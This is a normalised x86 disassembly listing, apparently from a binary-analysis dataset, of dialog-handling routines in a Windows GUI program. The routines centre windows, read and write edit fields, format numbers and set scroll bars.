lea eax [ esp + 0x8 ]
push eax
push ecx
call esi
mov edi [ esp + 0x12c ]
lea edx [ esp + 0x18 ]
push edx
push edi
call esi
mov ecx [ esp + 0x24 ]
mov eax [ esp + 0x1c ]
mov edx [ esp + 0x14 ]
sub eax ecx
mov ecx [ esp + 0xc ]
sub eax ecx
add eax edx
cdq
sub eax edx
mov edx [ esp + 0x10 ]
sar eax 0x1
add eax ecx
mov ecx [ esp + 0x20 ]
push 0x5
push 0x0
push 0x0
push eax
mov eax [ esp + 0x28 ]
sub eax ecx
mov ecx [ esp + 0x18 ]
sub eax ecx
add eax edx
cdq
sub eax edx
sar eax 0x1
add eax ecx
push eax
push 0x0
push edi
call [ SetWindowPos@IAT ]
cmp [ rw-data ] 0x1
jg r-xdata
dec eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
push r--data
lea eax [ esp + 0x2c ]
push eax
call [ lstrcpyA@IAT ]
jmp r-xdata
xor eax eax
pop esi
add esp 0x120
retn
mov eax [ esp + 0x130 ]
cmp ax 0x1
jne r-xdata
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
lea eax [ esp + 0x28 ]
push eax
push 0x0
push 0xc
push 0x411
push edi
call [ SendDlgItemMessageA@IAT ]
push 0x410
push edi
call [ GetDlgItem@IAT ]
push eax
call [ SetFocus@IAT ]
pop edi
cmp ax 0x2
jne r-xdata
mov esi [ esp + 0x128 ]
lea eax [ esp + 0x24 ]
push eax
push 0x100
push 0xd
push 0x410
push esi
call [ SendDlgItemMessageA@IAT ]
lea ecx [ esp + 0x24 ]
push ecx
call j_sub_4b692d
add esp 0x4
cmp eax 0x1
jl r-xdata
push edx
push 0x1
lea edx [ esp + 0x30 ]
push r--data
push edx
call [ wsprintfA@IAT ]
add esp 0x10
mov edx [ esp + 0x128 ]
push 0x2
push edx
call [ EndDialog@IAT ]
mov eax 0x1
pop esi
add esp 0x120
retn
push 0x0
call [ MessageBeep@IAT ]
mov eax 0x1
pop esi
add esp 0x120
retn
cmp eax [ rw-data ]
jg r-xdata
push 0x1
push 0x0
dec eax
push eax
push esi
call sub_485220
add esp 0x10
push 0x1
push esi
call [ EndDialog@IAT ]
mov eax 0x1
pop esi
add esp 0x120
retn
sub_4877a0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c1410
push eax
mov [ fs : 0x0 ] esp
sub esp 0x70
push ebx
push ebp
push esi
push edi
call [ timeGetTime@IAT ]
mov edx [ rw-data ]
xor ebx ebx
cmp edx ebx
mov ebp eax
je r-xdata
mov ecx [ rw-data ]
mov eax [ rw-data ]
sub ebp ecx
cmp ebp eax
jbe r-xdata
mov edi [ rw-data ]
mov ecx edi
sub ecx edx
sar ecx 0x2
cmp ecx ebx
jbe r-xdata
cmp [ rw-data ] ebx
je r-xdata
cmp [ esp + 0x98 ] 0x4
mov ebp 0x2
jne r-xdata
mov eax [ rw-data ]
mov esi ebp
sub esi eax
cmp [ esp + 0x98 ] 0x4
mov eax [ rw-data ]
jne r-xdata
mov ecx [ esp + 0x80 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x7c
retn 0x10
mov eax [ rw-data ]
push eax
mov [ rw-data ] eax
mov [ rw-data ] 0x32
call [ GetDC@IAT ]
mov esi eax
push ebx
push esi
call sub_473580
mov edx [ rw-data ]
add esp 0x8
push esi
push edx
call [ ReleaseDC@IAT ]
mov edi [ rw-data ]
mov edx [ rw-data ]
mov ecx [ rw-data ]
xor eax eax
cmp edi ebp
setl al
dec eax
and eax edx
cmp ecx eax
jle r-xdata
cmp [ rw-data ] ebp
jl r-xdata
cmp eax ebx
jg r-xdata
dec ecx
cmp eax ecx
jl r-xdata
lea ecx [ esp + 0x64 ]
push ecx
lea edx [ esp + 0x14 ]
push edx
call sub_45e3f0
mov esi [ rw-data ]
add esp 0x8
cmp esi ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
mov eax [ rw-data ]
dec eax
mov eax [ rw-data ]
jmp r-xdata
mov ecx [ edi - 0x4 ]
sub ecx [ edx + eax * 4 ]
cmp esi ecx
jbe r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
cmp esi [ edx + eax * 4 + 0x4 ]
jbe r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov edx [ rw-data ]
cmp edx 0x1
je r-xdata
cmp [ esp + 0x78 ] ebx
mov eax [ rw-data ]
jle r-xdata
cmp [ rw-data ] ebx
jne r-xdata
cmp [ rw-data ] eax
jle r-xdata
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x68 ]
push ecx
call sub_45e3f0
mov esi [ rw-data ]
add esp 0x8
cmp esi ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
cmp [ rw-data ] eax
jge r-xdata
mov edi [ rw-data ]
dec eax
cmp edi ebx
mov [ rw-data ] eax
jne r-xdata
mov eax [ rw-data ]
push eax
jmp r-xdata
mov edx [ rw-data ]
dec ecx
cmp edx ebx
mov [ rw-data ] ecx
jne r-xdata
mov edi [ rw-data ]
inc eax
cmp edi ebx
mov [ rw-data ] eax
jne r-xdata
mov ecx [ rw-data ]
cmp ecx ebx
mov [ rw-data ] ebx
je r-xdata
mov edx [ rw-data ]
mov esi [ LockWindowUpdate@IAT ]
push edx
call esi
cmp [ rw-data ] ebp
jl r-xdata
mov ecx [ rw-data ]
cmp ecx ebx
je r-xdata
mov ecx [ rw-data ]
cmp ecx ebx
jne r-xdata
cmp eax 0x3
je r-xdata
mov eax [ rw-data ]
push eax
push 0x1
push 0x81
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov edx [ rw-data ]
push edx
push 0x1
push 0x1
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov edx [ rw-data ]
cmp edx 0x1
je r-xdata
mov edx [ esp + 0x24 ]
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x1c ]
add eax edx
cmp eax ecx
mov eax [ rw-data ]
jge r-xdata
cmp [ rw-data ] ebx
jne r-xdata
cmp [ rw-data ] eax
jge r-xdata
mov ecx [ rw-data ]
sub ecx edi
sar ecx 0x2
xor ecx ecx
jmp r-xdata
push 0x1
push 0x6e
call sub_48a5f0
add esp 0xc
mov [ rw-data ] ebx
jmp r-xdata
mov eax [ rw-data ]
sub eax edx
sar eax 0x3
xor eax eax
jmp r-xdata
mov ecx [ rw-data ]
sub ecx edi
sar ecx 0x2
xor ecx ecx
jmp r-xdata
mov eax [ rw-data ]
mov ecx [ eax ]
push 0x1
jmp r-xdata
mov eax [ rw-data ]
sub eax ecx
sar eax 0x3
cmp eax ebx
jle r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
cmp eax ecx
je r-xdata
cmp edx ebp
jne r-xdata
cmp [ ecx + 0x380 ] ebx
jne r-xdata
cmp ecx 0x1
jne r-xdata
cmp [ esp + 0x24 ] ebx
jle r-xdata
cmp eax ebp
jne r-xdata
call [ timeGetTime@IAT ]
mov [ rw-data ] eax
cmp [ rw-data ] ebp
jl r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
mov ecx [ rw-data ]
cmp ecx ebx
jne r-xdata
cmp eax 0x3
je r-xdata
mov edx [ rw-data ]
push edx
push 0x1
push 0x7f
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov ecx [ rw-data ]
push ecx
push 0x1
push ebx
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov esi [ edi + eax * 4 ]
cmp esi ebx
jle r-xdata
cmp ecx eax
jle r-xdata
push 0x1
mov eax [ edx + ecx * 8 ]
cmp eax 0xffffffff
mov edx [ edx + ecx * 8 + 0x4 ]
jne r-xdata
cmp eax ecx
jle r-xdata
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ edi + eax * 4 ]
cmp esi ebx
jle r-xdata
cmp ecx eax
jle r-xdata
mov edx [ rw-data ]
dec ecx
push 0x1
push ecx
push edx
call sub_485220
add esp 0x10
call [ timeGetTime@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] ebp
jmp r-xdata
mov eax [ ecx ]
cmp eax 0xffffffff
mov ecx [ ecx + 0x4 ]
jne r-xdata
mov edx [ rw-data ]
push edx
push 0x1
push 0xa
cmp [ eax + 0x380 ] ebx
jne r-xdata
mov edx [ rw-data ]
push 0x1
push ebx
push eax
push edx
call sub_485220
add esp 0x10
jmp r-xdata
cmp [ rw-data ] ebx
je r-xdata
mov ecx [ rw-data ]
push ecx
push 0x1
push 0x70
call sub_48a5f0
add esp 0xc
mov [ rw-data ] ebx
jmp r-xdata
cmp [ rw-data ] ebp
jge r-xdata
mov eax [ rw-data ]
cmp eax ebx
jne r-xdata
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x20 ]
add edx ecx
cmp edx [ esp + 0x1c ]
jge r-xdata
cmp eax 0x3
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
mov ecx [ rw-data ]
mov eax [ rw-data ]
cmp ecx eax
je r-xdata
cmp edx ebp
jne r-xdata
cmp [ eax + 0x380 ] ebx
jne r-xdata
cmp ecx 0x1
jne r-xdata
mov ecx [ esp + 0x78 ]
mov edx [ esp + 0x74 ]
add edx ecx
cmp edx [ esp + 0x70 ]
jge r-xdata
cmp eax ebp
jne r-xdata
mov edx [ rw-data ]
cmp edx ebx
jne r-xdata
cmp edx 0xffffffff
jne r-xdata
mov eax [ rw-data ]
neg eax
sbb eax eax
and eax 0x2710
mov ecx [ rw-data ]
push ecx
push 0x1
push ebx
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov edx [ rw-data ]
cmp edx ebx
jne r-xdata
cmp ecx 0xffffffff
jne r-xdata
mov eax [ rw-data ]
neg eax
sbb eax eax
and eax 0x2710
mov ecx [ rw-data ]
push ebx
push ebx
push ebx
push ebx
push ebx
push ecx
call sub_466930
add esp 0x18
lea eax [ esp + 0x64 ]
push eax
lea ecx [ esp + 0x14 ]
push ecx
call sub_45e3f0
mov eax [ rw-data ]
add esp 0x8
cmp eax ebx
je r-xdata
cmp [ rw-data ] ebx
jne r-xdata
push ebx
call esi
cmp [ rw-data ] ebx
je r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
push 0x1
push ebx
push eax
push ecx
call sub_485220
add esp 0x10
jmp r-xdata
cmp [ rw-data ] ecx
je r-xdata
mov edi 0xf
mov [ esp + 0x60 ] edi
mov [ esp + 0x5c ] ebx
mov [ esp + 0x4c ] bl
cmp [ rw-data ] ebx
push 0xffffffff
mov [ esp + 0x8c ] ebp
lea ecx [ esp + 0x4c ]
push ebx
jne r-xdata
mov eax [ eax ]
xor eax eax
jmp r-xdata
cmp eax 0x3
je r-xdata
cmp eax 0x1
jne r-xdata
mov ecx [ rw-data ]
push 0x1
push ebx
push ebx
push ecx
call sub_485220
add esp 0x10
jmp r-xdata
cmp [ eax + 0x380 ] ebx
je r-xdata
push 0x1
push ebx
push ecx
mov ecx [ rw-data ]
push ecx
call sub_485220
add esp 0x10
jmp r-xdata
cmp [ rw-data ] ebx
je r-xdata
mov edx [ rw-data ]
push edx
cmp [ rw-data ] ebp
jge r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x8 ] eax
je r-xdata
cmp [ esp + 0x78 ] ebx
jle r-xdata
cmp eax 0x3
je r-xdata
mov eax [ rw-data ]
push eax
push 0x1
push 0x7f
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov ecx [ rw-data ]
sub ecx edx
sar ecx 0x3
xor ecx ecx
jmp r-xdata
mov [ rw-data ] eax
mov [ rw-data ] edx
push ebx
jmp r-xdata
xor edx edx
mov ecx [ rw-data ]
sub ecx edx
sar ecx 0x3
xor ecx ecx
jmp r-xdata
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] ecx
mov ecx [ eax ]
push ebx
jmp r-xdata
xor ecx ecx
mov edi [ rw-data ]
mov ecx [ esp + 0x1c ]
xor edx edx
cmp edi ebx
setne dl
dec edx
and edx ecx
mov [ rw-data ] edx
cmp eax ebp
jne r-xdata
mov ecx [ rw-data ]
push ecx
push 0x1
push 0x81
jmp r-xdata
mov eax [ rw-data ]
push eax
push 0x1
push 0x1
jmp r-xdata
push rw-data
push rw-data
jmp r-xdata
cmp esi ebx
jne r-xdata
cmp [ eax + 0x8 ] ecx
je r-xdata
cmp eax 0x1
je r-xdata
cmp esi ebx
jne r-xdata
push 0x1
push ebx
push eax
mov eax [ rw-data ]
push eax
call sub_485220
add esp 0x10
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
mov edi 0xf
mov [ esp + 0x44 ] edi
mov [ esp + 0x40 ] ebx
mov [ esp + 0x30 ] bl
cmp [ rw-data ] ebx
push 0xffffffff
mov [ esp + 0x8c ] ebx
lea ecx [ esp + 0x30 ]
push ebx
jne r-xdata
cmp eax 0x3
je r-xdata
cmp eax 0x1
jne r-xdata
mov ecx [ rw-data ]
push 0x1
push 0x1
dec esi
push esi
push ecx
call sub_485220
add esp 0x10
jmp r-xdata
mov ecx [ edx + eax * 8 ]
cmp ecx 0xffffffff
mov edx [ edx + eax * 8 + 0x4 ]
jne r-xdata
cmp ecx eax
jle r-xdata
mov eax [ rw-data ]
mov ecx [ eax + ecx * 4 ]
mov eax [ rw-data ]
push 0x1
push 0x1
dec esi
push esi
push eax
call sub_485220
add esp 0x10
jmp r-xdata
mov ecx [ edx + eax * 8 ]
cmp ecx 0xffffffff
mov edx [ edx + eax * 8 + 0x4 ]
jne r-xdata
cmp ecx eax
jle r-xdata
mov eax [ esp + 0x70 ]
mov [ rw-data ] eax
cmp eax 0x1
jne r-xdata
cmp eax ebx
je r-xdata
call sub_48a5f0
add esp 0xc
push rw-data
push rw-data
jmp r-xdata
call sub_401dd0
mov eax [ rw-data ]
mov esi [ LockWindowUpdate@IAT ]
push eax
call esi
mov ecx [ rw-data ]
push ecx
push 0x1
push 0x1
call sub_48a5f0
add esp 0xc
push ebx
call esi
mov [ esp + 0x44 ] edi
mov [ esp + 0x40 ] ebx
mov [ esp + 0x30 ] bl
cmp [ rw-data ] ebx
push 0xffffffff
mov [ esp + 0x8c ] 0x3
lea ecx [ esp + 0x30 ]
push ebx
jne r-xdata
mov edx [ rw-data ]
push edx
push 0x1
push 0x81
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov ecx [ rw-data ]
push ecx
push 0x1
push 0x1
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov edx [ rw-data ]
push edx
push 0x1
push ebx
call sub_48a5f0
add esp 0xc
jmp r-xdata
push rw-data
push rw-data
jmp r-xdata
cmp eax 0x1
je r-xdata
cmp edx 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
neg ecx
sbb ecx ecx
and ecx 0x2710
cmp edx 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
neg ecx
sbb ecx ecx
and ecx 0x2710
cmp [ rw-data ] ebx
je r-xdata
mov ecx [ rw-data ]
push ecx
push 0x1
push 0x70
call sub_48a5f0
add esp 0xc
lea ecx [ esp + 0x2c ]
mov [ rw-data ] ebx
call sub_4480e0
lea ecx [ esp + 0x48 ]
call sub_4480e0
jmp r-xdata
call sub_401dd0
lea edx [ esp + 0x2c ]
push edx
lea eax [ esp + 0x4c ]
push eax
call sub_4013c0
add esp 0x8
test al al
je r-xdata
push rw-data
push rw-data
jmp r-xdata
call sub_401dd0
mov ecx [ rw-data ]
push ecx
push 0x1
push ebx
call sub_48a5f0
add esp 0xc
mov [ esp + 0x28 ] edi
mov [ esp + 0x24 ] ebx
mov [ esp + 0x14 ] bl
cmp [ rw-data ] ebx
push 0xffffffff
mov [ esp + 0x8c ] 0x1
lea ecx [ esp + 0x14 ]
push ebx
jne r-xdata
mov [ rw-data ] edx
mov [ rw-data ] ecx
mov edx [ edi + eax * 4 ]
mov eax [ rw-data ]
push ebx
push 0x1
dec edx
push edx
push eax
call sub_485220
add esp 0x10
jmp r-xdata
xor edx edx
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov ecx [ edi + eax * 4 ]
mov edx [ rw-data ]
push ebx
push 0x1
dec ecx
push ecx
push edx
call sub_485220
add esp 0x10
jmp r-xdata
xor edx edx
mov eax [ rw-data ]
push ebx
push ebx
push ebx
push ebx
push ebx
push eax
call sub_466930
add esp 0x18
lea ecx [ esp + 0x2c ]
call sub_4480e0
lea ecx [ esp + 0x48 ]
mov [ esp + 0x88 ] 0xffffffff
call sub_4480e0
jmp r-xdata
lea edx [ esp + 0x64 ]
push edx
lea eax [ esp + 0x14 ]
push eax
call sub_45e3f0
mov eax [ rw-data ]
add esp 0x8
cmp eax ebx
je r-xdata
lea ecx [ esp + 0x10 ]
call sub_4480e0
lea ecx [ esp + 0x2c ]
mov [ esp + 0x88 ] 0xffffffff
call sub_4480e0
jmp r-xdata
mov ecx [ rw-data ]
push ecx
push 0x1
push 0x6e
call sub_48a5f0
add esp 0xc
lea ecx [ esp + 0x10 ]
mov [ rw-data ] ebx
call sub_4480e0
lea ecx [ esp + 0x2c ]
call sub_4480e0
jmp r-xdata
call sub_401dd0
lea edx [ esp + 0x10 ]
push edx
lea eax [ esp + 0x30 ]
push eax
call sub_4013c0
add esp 0x8
test al al
je r-xdata
mov edi [ rw-data ]
mov edx [ esp + 0x1c ]
xor ecx ecx
cmp edi ebx
setne cl
dec ecx
and ecx edx
mov [ rw-data ] ecx
cmp eax ebp
jne r-xdata
mov edx [ esp + 0x70 ]
mov [ rw-data ] edx
cmp eax 0x1
jne r-xdata
cmp eax ebx
je r-xdata
sub_488210
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c142b
push eax
mov eax [ esp + 0x14 ]
mov [ fs : 0x0 ] esp
sub esp 0x28c
sub eax 0x110
push ebx
push ebp
push esi
push edi
je r-xdata
mov ecx [ rw-data ]
mov edi [ GetWindowRect@IAT ]
lea eax [ esp + 0x54 ]
push eax
push ecx
call edi
mov esi [ esp + 0x2ac ]
lea edx [ esp + 0x1c ]
push edx
push esi
call edi
mov ebx [ esp + 0x28 ]
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x58 ]
mov edx [ esp + 0x60 ]
sub eax ebx
sub eax ecx
mov ebx [ esp + 0x5c ]
add eax edx
cdq
sub eax edx
sar eax 0x1
add eax ecx
mov ecx [ esp + 0x24 ]
push 0x5
push 0x0
push 0x0
push eax
mov eax [ esp + 0x2c ]
sub eax ecx
mov ecx [ esp + 0x64 ]
sub eax ecx
add eax ebx
cdq
sub eax edx
sar eax 0x1
add eax ecx
push eax
push 0x0
push esi
call [ SetWindowPos@IAT ]
mov eax [ rw-data ]
mov ebx 0x1
cmp eax ebx
jne r-xdata
dec eax
je r-xdata
mov [ rw-data ] ebx
mov eax 0x2710
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov edi [ esp + 0x2b4 ]
mov ebx 0x1
cmp di bx
jne r-xdata
sub eax 0x3
jne r-xdata
fld [ rw-data ]
push ecx
fmul [ r--data ]
fstp [ esp ]
call sub_452500
add esp 0x4
push r--data
xor edi edi
push esi
mov ebx eax
mov [ esp + 0x20 ] edi
mov [ esp + 0x18 ] edi
call [ SetWindowTextA@IAT ]
push edi
mov edi [ GetDlgItem@IAT ]
push 0x54b
push esi
call edi
push eax
call [ ShowWindow@IAT ]
mov edx [ rw-data ]
mov eax [ rw-data ]
mov ebx [ rw-data ]
push r--data
push esi
mov [ esp + 0x20 ] edx
mov [ esp + 0x18 ] eax
call [ SetWindowTextA@IAT ]
mov edi [ GetDlgItem@IAT ]
push 0x5
push 0x54b
push esi
call edi
push eax
call [ ShowWindow@IAT ]
mov ecx [ rw-data ]
push ecx
push 0x54b
push esi
call [ CheckDlgButton@IAT ]
jmp r-xdata
cmp [ rw-data ] ebx
jne r-xdata
cmp di 0x2
jne r-xdata
mov eax [ rw-data ]
mov ebp [ esp + 0x2ac ]
cmp eax ebx
lea eax [ esp + 0x9c ]
push eax
push 0x100
push 0xd
push 0x52a
push ebp
jne r-xdata
xor eax eax
mov edi [ esp + 0x2b8 ]
lea eax [ esp + 0x1c ]
push eax
push 0x2
push edi
mov [ esp + 0x28 ] 0x1c
mov [ esp + 0x2c ] 0x7
call [ GetScrollInfo@IAT ]
mov ecx [ esp + 0x2b4 ]
movzx eax cx
cmp eax 0x7
mov [ esp + 0x20 ] 0x4
ja r-xdata
fld [ rw-data ]
push ecx
fmul [ r--data ]
fstp [ esp ]
call sub_452500
add esp 0x4
mov [ esp + 0x4c ] eax
push ebx
lea edx [ esp + 0xa0 ]
push r--data
push edx
call [ wsprintfA@IAT ]
add esp 0xc
lea eax [ esp + 0x9c ]
push eax
push 0x0
push 0xc
push 0x52a
push esi
call ebp
push 0x52a
push esi
mov [ esp + 0x54 ] ebx
call edi
push eax
call [ SetFocus@IAT ]
push 0xffffffff
push 0x0
push 0xb1
push 0x52a
push esi
call ebp
jmp r-xdata
test ebx ebx
mov [ rw-data ] 0x1
je r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
imul eax eax 0x70
mov edi [ ecx + eax + 0x4c ]
add ecx eax
mov eax 0x64
cdq
idiv edi
test eax eax
mov [ rw-data ] eax
jne r-xdata
cmp di 0x52a
je r-xdata
mov eax [ esp + 0x2ac ]
push 0x2
push eax
call [ EndDialog@IAT ]
mov eax ebx
jmp r-xdata
mov esi [ SendDlgItemMessageA@IAT ]
call esi
lea ecx [ esp + 0x9c ]
push ecx
call j_sub_4b692d
add esp 0x4
lea edx [ esp + 0x9c ]
push edx
push 0x100
push 0xd
push 0x413
push ebp
mov [ rw-data ] eax
call esi
lea eax [ esp + 0x9c ]
push eax
call j_sub_4b692d
add esp 0x4
lea ecx [ esp + 0x9c ]
push ecx
push 0x100
push 0xd
push 0x414
push ebp
mov [ rw-data ] eax
call esi
lea edx [ esp + 0x9c ]
push edx
call j_sub_4b692d
mov esi [ rw-data ]
add esp 0x4
push 0x54b
push ebp
mov [ rw-data ] eax
call [ IsDlgButtonChecked@IAT ]
test eax eax
je r-xdata
mov edi [ SendDlgItemMessageA@IAT ]
call edi
lea ecx [ esp + 0x9c ]
push ecx
call j_sub_4b692d
add esp 0x4
test eax eax
mov [ esp + 0x14 ] eax
je r-xdata
push 0x1
lea eax [ esp + 0x20 ]
push eax
push 0x2
push edi
call [ SetScrollInfo@IAT ]
mov al [ rw-data ]
test al al
jne r-xdata
jmp [ eax * 4 + jump_table_488d84 ]
mov ecx [ esp + 0x5c ]
sub ecx [ esp + 0x54 ]
mov [ esp + 0x4c ] ecx
push ebx
lea edx [ esp + 0xa0 ]
push r--data
push edx
call [ wsprintfA@IAT ]
add esp 0xc
lea eax [ esp + 0x9c ]
push eax
push 0x0
push 0xc
push 0x413
push esi
call ebp
push 0x413
push esi
mov [ esp + 0x54 ] ebx
call edi
push eax
call [ SetFocus@IAT ]
push 0xffffffff
push 0x0
push 0xb1
push 0x413
push esi
call ebp
jmp r-xdata
push 0x1
lea ecx [ esp + 0x3c ]
push ecx
push 0x2
push 0x40b
push esi
mov [ esp + 0x4c ] 0x1c
mov [ esp + 0x50 ] 0x7
mov [ esp + 0x5c ] 0xa
mov [ esp + 0x54 ] 0x1
mov [ esp + 0x58 ] 0x199
call edi
push eax
call [ SetScrollInfo@IAT ]
mov ebx [ esp + 0x18 ]
test ebx ebx
je r-xdata
mov ecx [ ecx + 0x50 ]
imul ecx edi
mov eax 0x3d0900
cdq
idiv ecx
push ecx
mov [ esp + 0x1c ] eax
fild [ esp + 0x1c ]
fsqrt
fmul [ r--data ]
fstp [ esp ]
call sub_452500
add esp 0x4
jmp r-xdata
mov [ rw-data ] ebx
mov ecx edi
shr ecx 0x10
cmp ecx 0x300
jne r-xdata
cmp di 0x413
je r-xdata
mov ecx [ esp + 0x29c ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x298
retn
test esi esi
mov [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov edx [ rw-data ]
imul eax eax 0x70
mov ecx [ eax + edx + 0x4c ]
mov esi [ eax + edx + 0x50 ]
add eax edx
cmp [ rw-data ] 0x2
mov [ esp + 0x10 ] ecx
mov [ esp + 0x18 ] esi
jne r-xdata
mov ecx [ rw-data ]
cmp eax ecx
jge r-xdata
mov ecx [ esp + 0x30 ]
push ecx
lea edx [ esp + 0xa0 ]
push r--data
push edx
call [ wsprintfA@IAT ]
mov esi [ esp + 0x2b8 ]
mov ebx [ GetDlgItem@IAT ]
add esp 0xc
push 0x40b
push esi
call ebx
cmp edi eax
jne r-xdata
mov ecx [ esp + 0x24 ]
jmp r-xdata
mov edx [ esp + 0x28 ]
sub edx [ esp + 0x2c ]
inc edx
mov [ esp + 0x30 ] edx
jmp r-xdata
mov eax [ esp + 0x30 ]
cmp eax [ esp + 0x24 ]
jle r-xdata
mov ecx [ esp + 0x28 ]
mov esi [ esp + 0x2c ]
mov eax [ esp + 0x30 ]
sub ecx esi
inc ecx
cmp eax ecx
jge r-xdata
mov eax [ esp + 0x30 ]
mov esi [ esp + 0x2c ]
mov ecx [ esp + 0x24 ]
sub eax esi
cmp eax ecx
mov [ esp + 0x30 ] eax
jge r-xdata
mov eax [ esp + 0x2c ]
mov ecx [ esp + 0x30 ]
mov edx [ esp + 0x28 ]
add ecx eax
sub edx eax
lea eax [ edx + 0x1 ]
cmp ecx eax
mov [ esp + 0x30 ] ecx
jle r-xdata
shr ecx 0x10
mov edx [ esp + 0x60 ]
sub edx [ esp + 0x58 ]
mov [ esp + 0x4c ] edx
push ebx
lea eax [ esp + 0xa0 ]
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0xc
lea ecx [ esp + 0x9c ]
push ecx
push 0x0
push 0xc
push 0x414
push esi
call ebp
push 0x414
push esi
mov [ esp + 0x54 ] ebx
call edi
push eax
call [ SetFocus@IAT ]
push 0xffffffff
push 0x0
push 0xb1
push 0x414
push esi
call ebp
jmp r-xdata
push 0x1
lea edx [ esp + 0x3c ]
push edx
push 0x2
push 0x40c
push esi
mov [ esp + 0x5c ] 0x64
mov [ esp + 0x54 ] 0x1
mov [ esp + 0x58 ] 0x1063
call edi
push eax
call [ SetScrollInfo@IAT ]
mov ebx [ esp + 0x10 ]
test ebx ebx
je r-xdata
mov edx [ rw-data ]
push eax
push edx
mov [ rw-data ] eax
lea eax [ esp + 0x1a4 ]
push r--data
push eax
call [ wsprintfA@IAT ]
mov ebp [ SendDlgItemMessageA@IAT ]
add esp 0x10
lea ecx [ esp + 0x19c ]
push ecx
push 0x0
push 0xc
push 0x411
push esi
call ebp
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
cmp di 0x414
jne r-xdata
push 0x1
push ebp
call [ EndDialog@IAT ]
mov eax 0x1
jmp r-xdata
mov ecx rw-data
call sub_404310
xor ebx ebx
jmp r-xdata
lea edx [ esp + 0x9c ]
push edx
push 0x100
push 0xd
push 0x413
push ebp
call edi
lea eax [ esp + 0x9c ]
push eax
call j_sub_4b692d
mov esi eax
add esp 0x4
test esi esi
mov [ esp + 0x14 ] esi
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
cmp eax ecx
jle r-xdata
mov eax ecx
mov [ esp + 0x14 ] eax
push 0x40c
push esi
call ebx
cmp edi eax
jne r-xdata
lea eax [ esp + 0x9c ]
push eax
push 0x0
push 0xc
push 0x52a
push esi
call [ SendDlgItemMessageA@IAT ]
jmp r-xdata
mov [ esp + 0x30 ] ecx
dec eax
mov [ esp + 0x30 ] eax
jmp r-xdata
inc eax
mov [ esp + 0x30 ] eax
jmp r-xdata
jmp r-xdata
mov [ esp + 0x30 ] eax
jmp r-xdata
push 0x1
lea eax [ esp + 0x3c ]
push eax
push 0x2
push 0x40d
push esi
mov [ esp + 0x5c ] 0x64
mov [ esp + 0x54 ] 0x1
mov [ esp + 0x58 ] 0x1063
call edi
push eax
call [ SetScrollInfo@IAT ]
mov [ rw-data ] 0x0
xor eax eax
mov [ esp + 0x7c ] 0xf
mov [ esp + 0x78 ] eax
mov [ esp + 0x68 ] al
mov esi [ esp + 0x2b8 ]
mov ebx [ SendMessageA@IAT ]
push eax
push eax
push 0xe
push esi
mov [ esp + 0x2b4 ] eax
call ebx
push eax
lea ecx [ esp + 0x68 ]
call sub_401f60
mov eax [ esp + 0x7c ]
mov ebp 0x10
cmp eax ebp
mov eax [ esp + 0x68 ]
jae r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
lea ecx [ esp + 0x9c ]
push ecx
push 0x100
push 0xd
push 0x414
push ebp
call edi
lea edx [ esp + 0x9c ]
push edx
call j_sub_4b692d
mov esi eax
add esp 0x4
test esi esi
mov [ esp + 0x14 ] esi
je r-xdata
fild [ esp + 0x10 ]
push ecx
fstp [ esp + 0x14 ]
fild [ rw-data ]
fmul [ esp + 0x14 ]
fmul [ r--data ]
fstp [ esp ]
call sub_452500
add esp 0x4
cmp esi eax
jge r-xdata
add ecx ecx
mov [ esp + 0x10 ] ecx
mov eax [ rw-data ]
imul eax eax 0x70
mov eax [ eax + edx + 0x4c ]
add ecx eax
cmp esi eax
mov [ esp + 0x10 ] ecx
jge r-xdata
fild [ esp + 0x14 ]
fmul [ r--data ]
fstp [ rw-data ]
mov [ esp + 0x14 ] ecx
push 0x40d
push esi
call ebx
cmp edi eax
jne r-xdata
lea ecx [ esp + 0x9c ]
push ecx
push 0x0
push 0xc
push 0x413
push esi
call [ SendDlgItemMessageA@IAT ]
jmp r-xdata
